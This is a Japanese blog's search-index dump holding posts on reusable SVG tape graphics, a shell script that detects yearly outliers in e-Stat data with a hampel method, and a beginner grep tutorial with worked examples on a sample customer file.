プロパティから値を継承するため、1つのプロパティのみを使用して色を動的に変更できます。\n単色のベースと、明るい領域と暗い領域に他の2つのレイヤーがあることを考えると、色を変更すると、テープの外観が異なります。\nさらに良いことに、SVGをテンプレートに変換し、\u0026lt;use\u0026gt; SVG要素の助けを借りて、SVGを複製せずにテープを再利用することができます。\n\u0026lt;svg style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;g id=\u0026#34;tape\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt; \u0026lt;!-- path contents --\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;!-- An example of using the tape from a template --\u0026gt; \u0026lt;svg class=\u0026#34;tape\u0026#34; style=\u0026#34;--angle: 10deg; color: red; --size: 120px;\u0026#34; aria-hidden=\u0026#34;true\u0026#34; focusable=\u0026#34;false\u0026#34; viewBox=\u0026#34;0 0 123 47\u0026#34;\u0026gt; \u0026lt;use href=\u0026#34;#tape\u0026#34;\u0026gt;\u0026lt;/use\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;use\u0026gt;要素を介してテープを追加した方法に注目してください。これの良いところは、CSS変数をインラインスタイルとして使用することです。\nCSSは次のようになります。\n.tape { width: var(--size); transform: rotate(var(--angle)); } まとめ SVGを使用してUIコンポーネントを構築すると、作業がより簡単かつ簡単になります。一部のUIコンポーネントは、100％完璧なユースケースやSVG（アバターカットアウトなど）ではない場合がありますが、作業しているプロジェクトのコンテキストによって異なります。\nおすすめの書籍 SVGエッセンシャルズ 第2版 SVGの解説書。SVGは2001年にW3C勧告として公開されたXMLベースの画像フォーマットです。 ベクターグラフィックスなので拡大縮小、変形しても美しさが損なわれません。 会社のロゴをSVGで作る企業も増えていますし、D3.jsによるデータビジュアライゼーションでも基盤技術としてSVGが使われています。 本書では簡潔なサンプルを数多く使い、基本的な図形の作成、アニメーションや複雑なグラフィックスの作成、さらにはスクリプトによる制御など、SVGの基礎から応用までをわかりやすく解説します。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 【特典付き】HTML5\u0026amp;CSS3デザイン 現場の新標準ガイド【第2版】 (Compass Booksシリーズ) 体系的に学ぶHTMLとCSSの仕様と実践 フロントエンドエンジニアはじめ、Web制作に関わっている人のためのHTML5/CSS3ガイドブックです。 HTMLとCSSの最新仕様を整理するとともに、主要ブラウザの対応状況など、現時点でどのポイントに留意して制作を進めていけばよいか、現場で必要不可欠な情報を解説しています。 また、フレキシブルボックスレイアウトやグリッドレイアウトなど、現在知っておくべきHTML\u0026#43;CSSレイアウトの手法についても、詳細に解説しています。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-24T16:18:06+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/catch_hu63ed63126958850caf33a21e9ed1b17d_111773_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/","title":"SVGとCSSでおしゃれでクールな最新のデザインにする"},{"content":"hampelによる異常値部分を追加しよう 前回はgoogle custom search の検索結果を利用して社会的に関心の高そうな列の抽出を試みました。\n今回は、以前紹介したhampelによる時系列データの異常値検知を組み込んで見たいと思います。\n前回取得した「人権侵犯事件の種類別」ごとにtime_code、valueをまとめcsvにしてhampelメソッドを適用します。\ntime_codeは月次なのですが、月ごとの事件数はかなりムラがあって比較が難しいので年次にまとめます。\n私人等に関するもの_暴行・虐待_家族間のもの_夫の妻に対するもの date,value 2007,2537 2008,2645 2009,2461 2010,2250 2011,2242 2012,2031 2013,1683 2014,1477 2015,1352 2016,1297 2017,1113 2018,900 2019,782 2020,534 コロナの影響なのか結構急激に下がっているのに検知しませんでした。\n母数が流石に少なすぎるのかちょっと見直しが必要ですね。\n閾値を色々変えてみましたがだめでした。\n残念です。\n年次のものについては一旦前の年との増減分を比較して閾値を超えたらアラートをあげるようにしようと思います。\nプログラム プログラムは以下の通りです。\nシェルプログラムから以前作ったhampelメソッドのpython を呼び出しています。\ngrep -e \u0026ldquo;^$nyear\u0026rdquo; -e \u0026ldquo;^$lyear\u0026rdquo; で直近２年間に異常値があった場合のみ検知するように絞りをかけています。\nfunction getHampel(){ echo \u0026#34;$column\u0026#34;|while read line;do cat \u0026#34;$STCSV\u0026#34;|grep \u0026#34;総数\u0026#34;|grep \u0026#34;,\\\u0026#34;$line\\\u0026#34;,\u0026#34;|$AWK -F, \u0026#39;{print $7\u0026#34;,\u0026#34;$10;}\u0026#39;|$SED -e \u0026#34;s|\\\u0026#34;||g\u0026#34; \u0026gt; \u0026#34;$TMPHCSV\u0026#34;; #月次だとムラがあって比較が難しいので年次にする years=$(cat \u0026#34;$TMPHCSV\u0026#34;|cut -c 1-4|sort|uniq -c|grep \u0026#34;^ 12\u0026#34;|$AWK \u0026#39;{print $2;}\u0026#39;); echo \u0026#34;date,value\u0026#34; \u0026gt; \u0026#34;$TMPHYCSV\u0026#34; echo \u0026#34;$years\u0026#34;|while read year;do local mcnt=$(cat \u0026#34;$TMPHCSV\u0026#34;|grep \u0026#34;^$year\u0026#34;|$AWK -F, \u0026#39;{print $2;}\u0026#39;|$AWK \u0026#39;{sum+=$0} END{print sum;}\u0026#39;); echo \u0026#34;$year,$mcnt\u0026#34; \u0026gt;\u0026gt;\u0026#34;$TMPHYCSV\u0026#34;; done #0:date:2021001111 value:5230 nyear=$(date +%Y); lyear=$((nyear-1)); hampelalert=$(python gethampel.py \u0026#34;$TMPHYCSV\u0026#34;|grep -e \u0026#34;^$nyear\u0026#34; -e \u0026#34;^$lyear\u0026#34;|tr \u0026#34;\\n\u0026#34; \u0026#34;:\u0026#34;); if [ -n \u0026#34;$hampelalert\u0026#34; ];then echo \u0026#34;$line,$hampelalert\u0026#34;; fi done } 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-24T13:50:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/","title":"e-Stat hampelで時系列データの異常値検知"},{"content":"はじめに grep（グレップ）コマンド。UNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。そして多くのユーザーがこのコマンドを使いこなしています。Webサーバーのログから特定のユーザーのみを抽出するちいさなスクリプトから、膨大なシステムログからロケットの軌道修正を計算する処理プログラムなど、半世紀もの長い間、一糸乱れることなく動き続けています。\n「grep」コマンドは、文字列、またはファイル内のをテキストを検索するための便利で不可欠なコマンドです。\n「grep」コマンドの正式な名称は「“global regular expression print.”」です。\nこのコマンドの名前は、正規表現に基づいてコンテンツを検索できる「g / re / p」に由来しています。\n「grep」コマンドには、ファイル内の文字列またはテキストを検索するため、複数の方法が用意されている。\n以下に「grep」コマンドを使用するいくつかの構文を示します。\nカラー表示 まず、grep コマンドをカラー表示にしてみます。\n以下のコマンドで、~/.bashrc を開きます。\n$ vim ~/.bashrc 以下の2行を ~/.bashrc に追記して保存して下さい。\nalias grep=\u0026#39;grep --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias ls=\u0026#39;ls -FG\u0026#39;; grep/egrep/fgrep そしてついでに lsコマンドもカラー表示に変更します。変更したら ~/.bashrcを以下のコマンドで再読込します。\n$ . ~/.bashrc $ では、grep コマンドを使ってみます。\nここでは /etc/passwordファイルをgrepしてrootを検索してみます。\n$ grep root /etc/password $ 構文 次の「grep」コマンドは、ファイル内の特定の文字列またはテキストを検索するために使用されます。\n$ grep 検索文字列 ファイル名 次の「grep」コマンドは、複数のファイル内の特定の文字列またはテキストを検索するために使用されます。\n$ grep 検索文字列 filename1 filename2 filename3 $ 次は、空白を含む文字列を検索します。この場合はシングルクォーテーション「\u0026rsquo;」、またはダブるクォーテーション「\u0026quot;」で文字列を囲む必要があります。\n$ grep \u0026#34;検索文字列 検索文字列\u0026#34; filename1 $ 次の「grep」コマンドは、ファイル内の特定のオプションを含む文字列を検索するために使用されます。「 grep」コマンドでは、さまざまな目的でさまざまなオプションが使用されます。\nここでは「-v」を紹介します。「-v」オプションは、検索文字列を含まない行を抽出するオプションです。\nこのオプションは、非常に多くの場面で利用されます。\n$ cat /etc/passwd | head ## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## bash-5.1$ cat /etc/passwd | head ## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ bash-5.1$ cat /etc/passwd | head | grep \"User\" # User Database $ $ cat /etc/passwd | head | grep -v \"User\" ## # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ まず、\n$ cat /etc/passwd $ で、/etc/passwd ファイルをcat します。\ncatするというのは、ファイル内容を出力すると言う意味になります。さらに、\n$ cat /etc/passwd | head $ の、headは、出力された /etc/passwd ファイルの冒頭１０行を抽出するというコマンド「head」です。「head」コマンドで -n5 オプションをつけることで冒頭5行目とすることもできます。\n$ cat /etc/passwd | head -n5 $ シェルスクリプトは、「| 」パイプでコマンドを連ねることで、前のコマンドに続いて、さらにコマンドの出力結果を絞り込むことができます。\n次のコマンドは、/etc/passwd ファイルを catコマンドで表示し、headコマンドで冒頭１０行を抽出、さらに grep -v コマンドで User を除く行を出力します。\n$ cat /etc/passwd | head | grep -v \u0026#34;User\u0026#34; 「 grep -v 」コマンドは、指定した文字列を含まない行を抽出するという意味です。\n-v をつけなければ、User という文字列を含む文字列が抽出されることになります。\nさらにgrepには強力な「-i」オプションがあります。\n「-i」オプションは、検索文字列の大文字、小文字を区別せずに抽出します。\n$ cat /etc/passwd | head | grep -iv \u0026#34;user\u0026#34; ## # # Note that this file is consulted directly only when the system is running # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ ヒント grep コマンドで最も使われる書式は $ cat \u0026lt;ファイル名\u0026gt; | grep \u0026ldquo;検索文字列\u0026rdquo; です。 以下、\u0026rsquo;-v\u0026rsquo; \u0026lsquo;-i\u0026rsquo; 二つのオプションをパイプで駆使すればgrepコマンドを使いこなしていると言っても過言ではありません。 # -v 除外 $ cat \u003cファイル名\u003e | grep -v \"検索文字列\" # -i 大文字小文字を区別しない $ cat \u003cファイル名\u003e | grep -i \"検索文字列\" 一致する文字列を検索 では手始めに、次のコマンドで、Customers.txtファイルの内容を表示します。以下の内容をCustomers.txtとして保存して下さい。\nID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 Customers.txtを表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次の「grep」コマンドは、Customers.txtファイルのテキストから「Ali」を含む語句を検索します。\n検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep Ali 45 Minhaz Ali ali@gmail.com +8801190761212 $ 次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。\n$ cat Customers.txt | grep 'Maliha Chowdhury' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ 一致しない文字列のみを検索 「grep」コマンドの-vオプションは、ファイルから一致しない文字列を検索するために使用されます。この例では、-vオプションを指定した「grep」コマンドを使用して、最初の例で作成したCustomers.txtファイルから一致しない文字列を検索しています。\n次のコマンドは、customers.txtファイルの内容を表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -v 'Abir' ID Name Email Phone 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント -vオプションは、ファイルから一致しない文字列を検索するために使用されます。 検索文字列を除外して検索する場合は、\u0026rsquo;-v\u0026rsquo;オプションを使います。\n$ cat \u0026lt;ファイル名\u0026gt; | grep -v \u0026ldquo;検索文字列\u0026rdquo; 大文字と小文字を区別しない一致の検索文字列 「grep」コマンドは、デフォルトで大文字と小文字を区別してファイルから文字列を検索します。\n「grep」コマンドの \u0026lsquo;-i\u0026rsquo; オプションは、大文字と小文字を区別しない方法でファイルから文字列を検索するために使用されます。\nこの例では、\u0026rsquo;-i\u0026rsquo; オプションを指定した「grep」コマンドを使用して、前に作成したCustomers.txtファイルから大文字と小文字を区別しない方法で特定の文字列を検索しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -i 'minhaz' 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント 文字が大文字または小文字の文字列を含む1つ以上の行がファイルに存在する場合、その行が出力されます。 大文字小文字を区別しないで検索する場合は、\u0026rsquo;-i\u0026rsquo;オプションを使います。\n$ cat \u0026lt;ファイル名\u0026gt; | grep -i \u0026ldquo;検索文字列\u0026rdquo; 単語全体のみを検索 「grep」コマンドの \u0026lsquo;-w\u0026rsquo; オプションは、大文字と小文字を区別してファイルから単語全体を検索するために使用されます。\nこの例では、\u0026rsquo;-w\u0026rsquo; オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルから単語全体を検索しています。\n次のコマンドは、customers.txtファイルの内容を表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次の「grep」コマンドは、文字列「Ma」を含むテキストファイルの行を検索します。ファイルのいずれかの行に文字列「Ma」が含まれている場合、その行が出力されます。\n$ cat Customers.txt | grep 'Ma' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次の「grep」コマンドは、「Ma」という単語を含むテキストファイルの行を「正確」に検索します。\nファイルのいずれかの行に「Ma」という単語が正確に含まれている場合、その行が出力されます。\n「Ma」という単語がないため、出力されません。\n$ cat Customers.txt | grep -w \u0026#39;Ma\u0026#39; $ 次の「grep」コマンドは、「Maliha」という単語を含むテキストファイルの行を正確に検索します。\nファイルのいずれかの行に「Maliha」という単語が正確に含まれている場合、その行が出力されます。\n$ cat Customers.txt | grep -w 'Maliha' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ ヒント \u0026lsquo;-w\u0026rsquo; オプションと検索語「Ma」を指定した「grep」コマンドは、テキストファイルに「Ma」という単語が含まれていないため、何も返しませんでした。 -wオプションと検索語「Maliha」を指定した「grep」コマンドは、「Maliha」という単語を含むファイルの5行目を返しました。 \u0026lsquo;-w\u0026rsquo; オプションは正確な単語を検索対象とするオプションです。 現在のディレクトリで複数のファイルを検索する 「grep」コマンドは、ファイル内の特定のコンテンツを検索し、検索文字列またはパターンに基づいて現在のディレクトリ内の複数のファイルを検索するために使用されます。\n* ワイルドカードを使用して現在のディレクトリ内の複数のファイルを検索する方法は、Customers.txtファイルのこの例に示されています。\n次の「grep」コマンドは、「split」という単語を含む現在のディレクトリのファイルを再帰的に検索します。\n\u0026lsquo;split\u0026rsquo;という単語を含む現在のディレクトリとサブディレクトリのファイルは、次の行で出力されます。\n$ grep -w split * $ ディレクトリを再帰的に検索する \u0026lsquo;-r\u0026rsquo; オプションは、「grep」コマンドとともに使用して、ディレクトリ内の特定の文字列またはパターンを再帰的に検索します。\nこの例では、「grep」コマンドを使用して現在のディレクトリを再帰的に検索し、Customers.txtファイルを検索します。\n$ grep -wr split * $ ヒント ディレクトリを指定して再帰的に検索したい場合は、\n$ grep 検索文字列 検索したい場所 となります。 $ grep -wr kpasswd /etc/services kpasswd 464/udp # kpasswd kpasswd 464/tcp # kpasswd rpasswd\t774/tcp # $ 行番号を出力に追加します 「grep」コマンドの \u0026lsquo;-n\u0026rsquo; オプションは、ファイルの行番号とともに検索文字列の出力を出力するために使用されます。\nこの例では、\u0026rsquo;-n\u0026rsquo; オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルの行番号を含む検索出力を表示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -n \"Ali\" 4:45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。 一致する行の後に特定の行数を印刷します 数値を含む \u0026lsquo;-A\u0026rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの後に特定の行数を出力するために使用されます。\nこの例では、Customers.txtファイルに対して「grep」コマンドの \u0026lsquo;-A\u0026rsquo; オプションを使用しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -A2 \"Ali\" 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。 一致する行の前に特定の行数を印刷します 数値を含む \u0026lsquo;-B\u0026rsquo; オプションは、ファイル内で一致する文字列またはパターンの前に特定の行数を出力するために使用されます。\nこの例では、Customers.txtファイルに対して「grep」コマンドの \u0026lsquo;-B\u0026rsquo; オプションの使用法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -B1 \"Riya\" 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 $ ヒント 文字列「Riya」はファイルの3行目にあります。2行目は、一致する行の前の行です。したがって、2行目と3行目は、一致する文字列を強調表示することによって出力に出力されています。 一致する行の前後の特定の行数を印刷します 数値を指定した \u0026lsquo;-C\u0026rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの前後の特定の行数を出力するために使用されます。\nこの例では、 Customers.txtファイルの「grep」コマンドの \u0026lsquo;-C\u0026rsquo; オプションの使用法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -C1 \"Maliha\" 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。5行目には、文字列 \u0026lsquo;Maliha\u0026rsquo;が含まれています。4行目は一致する行の前の行で、6行目は一致する行の次の行です。したがって、4行目、5行目、および6行目は、一致する文字列を強調表示することによって出力に出力されています。 ブラケットを使用して特定の数字を一致させる[] 特定の桁の範囲は、角かっこ[]を使用して、「grep」コマンドの正規表現パターンで定義できます。\nこの例では、Customers.txtファイルの「grep」コマンドを使用して特定の数字を検索する方法を示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ cat Customers.txt | grep '[3-5]' $ 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ ヒント [3-5] は、3,4,5 のいずれかを検索文字列とするという意味となります。 2,3,4,5,6 としたい場合は、 [2-6]となります。 3番目のブラケットを使用してパターンを特定の文字と一致させる[] ファイルの特定の文字は、角かっこ[]を使用してさまざまな方法で一致させることができます。\n角かっこを使用してファイルから特定の行を検索することにより、正規表現パターンで文字の範囲または特定の文字を使用できます。\nこの例では、文字範囲または特定の文字のパターンを使用して、Customers.txtファイル内の特定の文字を検索する方法を示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep 'Ma[lr]' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント Ma から始まる単語を検索し、さらに続く文字列が \u0026lsquo;[lr]\u0026rsquo; すなわち、l または r である文字列を検索します。いわゆる「Mal」と「Mar」を検索するという意味になります。 [：alnum：]クラスを使用してアルファベットと数字を一致させる [:alnum:]クラスは、アルファベットと数字を照合するために正規表現パターンで使用されます。\nパターン[A-z0-9]に相当します。\n[：alpha：]クラスを使用してアルファベット文字を照合する [:alpha:]クラスは、アルファベット文字のみに一致する正規表現パターンで使用されます。\nパターン[A-z]に相当します。\n[：digit：]クラスを使用して数字を照合する [:digit:]クラスは、正規表現パターンで数字のみに一致するために使用されます。\nパターン[0-9]と同等です。\n[：lower：]クラスを使用して小文字を照合する [:lower:]クラスは、すべての小文字のみに一致するように正規表現パターンで使用されます。\nパターン[a-z]と同等です。\n[：space：]クラスを使用してスペース文字を一致させる [:space:]クラスは、スペース文字を含む行と一致させるために正規表現パターンで使用されます。\nヒント tab文字、空白も含めて検索対象となります。 $ grep \u0026ldquo;test(タブ文字)\u0026rdquo; /path/to/file\n:と、入力したい場合は、ctrl-v を入力してからタブを打つと入力される。 \u0026lsquo;[[:space:]]\u0026rsquo; では空白文字もタブ文字もマッチする。\nこれならメモなどからコピペできる。\n$ grep \u0026ldquo;test[[:space:]]\u0026rdquo; /path/to/file また、\n$ grep test$\u0026rsquo;\\t\u0026rsquo; /path/to/file\nであればタブだけがマッチする。\n行頭からの検索 キャレット（^）記号は、ファイル内の特定の文字または文字列で始まる行と一致するように正規表現で使用されます。\nこの記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep ^4 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。出力によると、customers.txtファイルには「 4 」で始まる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。 行の終わりに一致する ドル（$）記号は、ファイル内の特定の文字または文字列と行末を一致させるために正規表現で使用されます。\nこの記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com 